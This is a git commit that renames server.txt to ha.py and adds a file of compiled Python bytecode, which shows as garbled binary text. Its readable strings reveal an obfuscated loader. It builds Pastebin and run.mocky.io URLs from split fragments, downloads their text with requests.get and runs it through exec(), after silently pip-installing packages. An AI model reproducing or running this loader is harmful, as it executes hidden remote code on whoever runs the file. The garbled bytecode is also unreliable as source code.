69f7dea7566e1e09cc42a3e1ef5db85d449b8d03
Mantalstudio <75010285+Mantalstudio@users.noreply.github.com>
2022-03-17 18:56:51 +0500

    Update and rename server.txt to ha.py

---
+++ ha.py
@@ -0,0 +1,17 @@
+o
+
+    <&òa¯  ã                   @   s‚  d dl Z d dlZd dlZzd dlZd dlmZ d dlmZ W n   e  d¡ e  d¡ e  d¡ e  d¡ Y e  d¡ e  d	¡ d
+Z	de	 Z
+dZd
+ZdZ
+dZdZdZdZdZdZdZdZdZ
+dZdZdZe ed e
+ d e d e d e d e d e ¡jZe ed e
+ d e d e
+ d e d e ¡jZzee de d e d e d e ¡jƒ W dS    ed ƒ Y dS )!é    N)Údate)Úsleepzpip install requestszpip install datezpip install datetimezpip install timeÚclsÚclearZcxZeJ7ZW6ÚFzkhiem895.gazraw/ZD5fZq7kZQj7mZcKZ4pZU9ZDZZpastebinzrun.mocky.ioZv3zhttps:/ú/z.com/Ú zhttps://ú-u:   [1;93m[[1;91mWARING[1;93m][1;91m Máº¥t Káº¿t Ná»‘i !!!)ÚosÚsysZjsonZrequestsZdatetimer   Útimer   ÚsystemÚdecodeÚbasesÚencodeZfunZkhiem895Z	requestssZrunfZokmZhttpsZrunbaseZrunhttpÚrunZdepzZ
+khiem895tkZvs3ZHTTPSÚgetÚtextZpas1Zpas0ÚexecÚexit© r   r   úeval.pyÚ<module>   sF    
+
+
+
+
+<42
